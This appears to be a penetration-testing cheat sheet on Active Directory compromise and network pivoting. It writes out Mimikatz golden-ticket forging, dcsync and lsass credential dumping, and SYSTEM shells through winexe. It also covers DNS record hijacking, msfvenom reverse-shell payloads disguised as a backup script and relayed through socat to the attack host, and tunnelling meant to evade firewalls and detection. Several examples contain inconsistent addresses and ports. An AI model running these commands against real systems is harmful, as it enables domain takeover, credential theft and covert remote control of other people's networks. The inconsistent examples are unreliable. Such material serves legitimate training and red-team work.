The Mimikatz command to create a golden ticket is “kerberos::golden”

* /domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.
* /sid – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
* /sids – Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain “S-1-5-21-1473643419-774954089-5872329127-519”. 
* /user – username to impersonate
* /groups (optional) – group RIDs the user is a member of (the first is the primary group).
Add user or computer account RIDs to receive the same access.
Default Groups: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
* /krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.
* /ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
* /ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
* /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).
* /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
* /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
* /renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
* /sids (optional) – set to be the SID of the Enterprise Admins group in the AD forest ([ADRootDomainSID]-519) to spoof Enterprise Admin rights throughout the AD forest (AD admin in every domain in the AD Forest).
* /aes128 – the AES128 key
* /aes256 – the AES256 key

Golden Ticket Default Groups:

* Domain Users SID: S-1-5-21<DOMAINID>-513
* Domain Admins SID: S-1-5-21<DOMAINID>-512
* Schema Admins SID: S-1-5-21<DOMAINID>-518
* Enterprise Admins SID: S-1-5-21<DOMAINID>-519 (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)
* Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
  
#### example 3: 
  
Mimikatz has a feature (dcsync) which utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file. This technique eliminates the need to authenticate directly with the domain controller as it can be executed from any system that is part of the domain from the context of domain administrator. Therefore it is the standard technique for red teams as it is less noisy.
```
lsadump::dcsync /domain:pentestlab.local /all /csv
```
  
By specifying the domain username with the /user parameter Mimikatz can dump all the account information of this particular user including his password hash.
```
lsadump::dcsync /domain:pentestlab.local /user:test
```
  
Alternatively executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process.
```
privilege::debug
```
```
lsadump::lsa /inject
```

### kekeo
similar to mimikatz
```
https://github.com/gentilkiwi/kekeo
```


### secretsdump-py
Remotely dump SAM and LSA secrets from a host.

```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
```

### evil-winrm
Provides us with an interactive shell on a host over the WinRM protocol.


```
https://github.com/Hackplayers/evil-winrm

```

### mssqlclient-py
Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
```

### noPac-py
Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.
```
https://github.com/Ridter/noPac
```

### rpcdump-py
Part of the Impacket toolset, RPC endpoint mapper.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py
```

### CVE-2021-1675-py
Printnightmare PoC in python.
```
https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
```

### ntlmrelayx-py
Part of the Impacket toolset, it performs SMB relay attacks.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
```

### PetitPotam-py
PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.
```
https://github.com/topotam/PetitPotam
```

### gettgtpkinit-py
Tool for manipulating certificates and TGTs.
```
https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
```

### getnthash-py
 	This tool will use an existing TGT to request a PAC for the current user using U2U.
```
https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
```

### adidnsdump
Active Directory Integrated DNS dumping by any authenticated user.
A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.
```
https://github.com/dirkjanm/adidnsdump
```

### gpp-decrypt
Extracts usernames and passwords from Group Policy preferences files.
```
https://github.com/t0thkr1s/gpp-decrypt
```

### GetNPUsers-py
Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
```

### lookupsid-py
SID bruteforcing tool.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py
```

### ticketer-py
A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
```

### raiseChild-py
Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py
```

### Active Directory Explorer
Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.
```
https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer
```

### PingCastle
Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security).
```
https://www.pingcastle.com/documentation/
```

### Group3r
Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).
```
https://github.com/Group3r/Group3r
```

### ADRecon
A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.
```
https://github.com/adrecon/ADRecon
```

### tcpdump 
we can use tcodump to perform the same functions as wireshark. We can also use tcpdump to save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.
```
https://linux.die.net/man/8/tcpdump
```

### net-creds
kinda like tcpdump
```
https://github.com/DanMcInerney/net-creds
```

### NetMiner
kinda like tcpdump
```
http://www.netminer.com/main/main-read.do
```

### Fping 
provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks will help us determine if anything else is active on the internal network. ICMP is not a one-stop-shop, but it is an easy way to get an initial idea of what exists. Other open ports and active protocols may point to new hosts for later targeting. 
```
https://fping.org/
```

### linkedin2username 
tool used to create a list of potentially valid users
```
https://github.com/initstring/linkedin2username
```
### SharpGPOAbuse
SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. 

a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.
```
https://github.com/FSecureLABS/SharpGPOAbuse
```

## nsupdate
nsupdate is used to submit Dynamic DNS Update requests as defined in RFC2136 to a name server. This allows resource records to be added or removed from a zone without manually editing the zone file. A single update request can contain requests to add or remove more than one resource record.

Zones that are under dynamic control via nsupdate or a DHCP server should not be edited by hand. Manual edits could conflict with dynamic updates and cause data to be lost. 

unsecured dynamic DNS updates gives any computer regardless of being joined to the domain or not, the ability to modify or create DNS records. 

As an example that we know we can update DNS records without our machine being joined to the domain we’ll use nsupdate. Let’s send a request to delete the existing A record for <ip/domain/etc> and then send an update add request for a new A record to have <service/etc> resolve to our <IP>.

```
nsupdate
```
```  
server <ip>
```
```
update delete <ip/domain/service/etc> 
```  
```  
send
```  
```
update add <same ip/domain/service/etc as you just removed> <port example 1234> A <your ip> 
```  
```  
send 
```  
```  
quit
```


  

## openssl
This package is part of the OpenSSL project’s implementation of the SSL and TLS cryptographic protocols for secure communication over the Internet.

It contains the general-purpose command line binary /usr/bin/openssl, useful for cryptographic operations such as:
creating RSA, DH, and DSA key parameters;
creating X.509 certificates, CSRs, and CRLs;
calculating message digests;
encrypting and decrypting with ciphers;
testing SSL/TLS clients and servers;
handling S/MIME signed or encrypted mail.

you can also create a public and private key with openssl using example and cert.pfx file

private key: 
```
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
```
public key:
```
openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys
```
  
then use the certs to being able to use example responder to catch a request. But Before you start responder you’ll want to copy the two certs generated earlier to "/usr/share/responder/certs" or wherever "/certs" lives on your machine so copy them over there and then change the responder config in the https part.

from:
```
[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```
to this for an example: 
```
[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/crt.pem
SSLKey = certs/key.pem
```  
  
you can also after this step, use those files to perform authentication via SSL using evil-winrm 

example: 
```
evil-winrm -S -c crt.pem -k key.pem -i 10.10.11.152
```
-c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
-k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
-S, --ssl                        Enable ssl

### mslink
This application allow you to create Windows Shortcut files (extension .LNK) without needing a Windows OS.
```
http://www.mamachine.org/mslink/index.en.html
```
### nishang
```
https://github.com/samratashok/nishang
```
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

 
### Invoke PowerShellTcp ps1
Invoke-PowerShellTcp.ps1 script coming from nishang:
```
https://github.com/samratashok/nishang
```
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

### winexe
Winexe remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package).

#### winexe Usage Example

With the given credentials (-U ‘Administrator%s3cr3t’), connect to the remote server (//192.168.1.225), and execute the given command (cmd.exe /c echo “this is running on windows”):
```
root@kali:~# winexe -U 'Administrator%s3cr3t' //192.168.1.225 'cmd.exe /c echo "this is running on windows"'
"this is running on windows"
```
#### example 2 
```
winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```
if your a admin (or have admin creds etc) you can modify the command a bit and add 
```
--system
```
so for an example: 
```
# winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
```
to spawn a system shell

### snmpwalk
SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.

![image](https://user-images.githubusercontent.com/24814781/191623204-8939db84-f6f2-4005-9082-0f12dfef6507.png)

![image](https://user-images.githubusercontent.com/24814781/191623228-bb8fe234-399e-4dfb-8185-f5c3f650cb71.png)

A tool such as onesixtyone
```
https://github.com/trailofbits/onesixtyone
```
can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool.

![image](https://user-images.githubusercontent.com/24814781/191627067-8be7f4e0-1aa1-4372-bf2c-569d07765350.png)


-------------------------------------------------------------------------------------


## Pivoting Tunneling and Port Forwarding
  
During a red team engagement, penetration test, or an Active Directory assessment, we will often find ourselves in a situation where we might have already compromised the required credentials, ssh keys, hashes, or access tokens to move onto another host, but there may be no other host directly reachable from our attack host. In such cases, we may need to use a pivot host that we have already compromised to find a way to our next target. One of the most important things to do when landing on a host for the first time is to check our privilege level, network connections, and potential VPN or other remote access software. If a host has more than one network adapter, we can likely use it to move to a different network segment. Pivoting is essentially the idea of moving to other networks through a compromised host to find more targets on different network segments.

There are many different terms used to describe a compromised host that we can use to pivot to a previously unreachable network segment. Some of the most common are:

    Pivot Host
    Proxy
    Foothold
    Beach Head system
    Jump Host

Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. Tunneling, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. Think of it like this:

We have a key we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.

Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.

We will inevitably come across several different terms used to describe the same thing in IT & the Infosec industry. With pivoting, we will notice that this is often referred to as Lateral Movement.

Isn't it the same thing as pivoting?

The answer to that is not exactly. Let's take a second to compare and contrast Lateral Movement with Pivoting and Tunneling, as there can be some confusion as to why some consider them different concepts.
  
### Lateral Movement, Pivoting, and Tunneling Compared
  
Lateral Movement

Lateral movement can be described as a technique used to further our access to additional hosts, applications, and services within a network environment. Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts. In addition to the explanation we have provided for this concept, we can also study how other respected organizations explain Lateral Movement. Check out these two explanations when time permits:

Palo Alto Network's Explanation

MITRE's Explanation

One practical example of Lateral Movement would be:

During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further. 

  
### Pivoting

Utilizing multiple hosts to cross network boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.

One practical example of Pivoting would be:

During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment. 


### Tunneling

We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. For example, using HTTP to mask our Command & Control traffic from a server we own to the victim host. The key here is obfuscation of our actions to avoid detection for as long as possible. We utilize protocols with enhanced security measures such as HTTPS over TLS or SSH over other transport protocols. These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.

One practical example of Tunneling would be:

One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.

To summarize, we should look at these tactics as separate things. Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments. 

## Meterpreter Tunneling and Port Forwarding

Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.

We know that the Windows target (example) is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.
example:
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.

Ping Sweep For Loop on Linux Pivot Hosts
example:
```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
Ping Sweep For Loop Using CMD
example:
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Ping Sweep Using PowerShell
example:
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built. 


There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
example:
```
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
```
Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

obs: in meterpreter on metasploit
example:
```
background 
use post/multi/manage/autoroute
set SESSION 1
set SUBNET  172.16.6.0
set NETMASK 24
run
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
example:
```
run autoroute -s 172.16.5.0/23
```

After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
example:
```
run autoroute -p
```

We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.
example:
```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

Port Forwarding
Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
```
help portfwd
```
```
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

Creating Local TCP Relay
example:
```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3300 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

Connecting to Windows Target through localhost
example:
```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Netstat Output
We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
example:
```
netstat -antp
```

Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
example:
```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.


### sshuttle
Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling.
```
https://github.com/sshuttle/sshuttle
```

### chisel
A fast TCP/UDP tunnel over HTTP 
```
https://github.com/jpillora/chisel
```

### Dynamic Port Forwarding with SSH and SOCKS Tunneling
we can port forward it to our localhost on port 1234 and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port 3306. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
```
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```
The -L command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.
  
Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the local port:server:port argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on 8080.
```
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (172.16.5.1-200) network or the entire subnet (172.16.5.0/23). We cannot perform this scan directly from our attack host because it does not have routes to the 172.16.5.0/23 network. To do this, we will have to perform dynamic port forwarding and pivot our network packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. 
```
ssh -D 9050 ubuntu@10.129.202.64
```

The -D argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port 9050. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.

To inform proxychains that we must use port 1080/9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 1080/9050 to the last line if it is not already there.

Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 1080/9050, where our SSH client is listening, which will forward all the packets over SSH to the x.x.x.x./23 network.

This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.

Using Metasploit with Proxychains

We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
```
proxychains msfconsole
```
Let's use the rdp_scanner auxiliary module to check if the host on the internal network is listening on 3389.
```
search rdp_scanner
```

Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For example, we can log in to the Windows remote host over the SOCKS tunnel. This can be done using xfreerdp. 

### Remote-Reverse Port Forwarding with SSH
We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well.

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.

Transferring Payload to Pivot Host
```
scp backupscript.exe ubuntu@<ipAddressofTarget>:/backupscript.exe  
```

Starting Python3 Webserver on Pivot Host

After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

```
python3 -m http.server 8123
```

We can download this backupscript.exe from the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
```
Invoke-WebRequest -Uri "http://<ip>:<port>/backupscript.exe" -OutFile "C:\backupscript.exe"
```


Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.

```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

## Socat Redirection with a Reverse Shell 

Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.

Starting Socat Listener

```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Creating the Windows Payload

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```


Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.


## Socat Redirection with a Bind Shell

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. 

We can create a bind shell using msfvenom with the below command.

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```


We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)


## SSH for Windows plink exe

Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.
```
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```
```
https://www.putty.org/
```

Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer. 

That is just one potential scenario where Plink could be beneficial. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.


The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

Using Plink.exe
```
plink -D 9050 ubuntu@10.129.15.50
```

Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

```
https://www.proxifier.com/
```

After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.


port 2805 is an example:
```
echo y|&./plink -R 2805:127.0.0.1:2805 -l <your username> -pw <your passwd> <your ip>
```
  
obs: make sure your ssh is open/started
```
sudo systemctl start ssh
```
the echo y is required the first time we run plink to tell it to accept the
ssh key of the server. The -R 2805:127.0.0.1:2805 is necessary to
bypass the local firewall and access veeam from your attacker
machine.
  
  
## SSH Pivoting with Sshuttle

Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts.
```
sudo apt-get install sshuttle
```
```
https://github.com/sshuttle/sshuttle
```


To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.


We can now use any tool directly without using proxychains.


## Web Server Pivoting with Rpivot
```
https://github.com/klsecservices/rpivot
```
Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

Cloning rpivot
```
sudo git clone https://github.com/klsecservices/rpivot.git
```
```
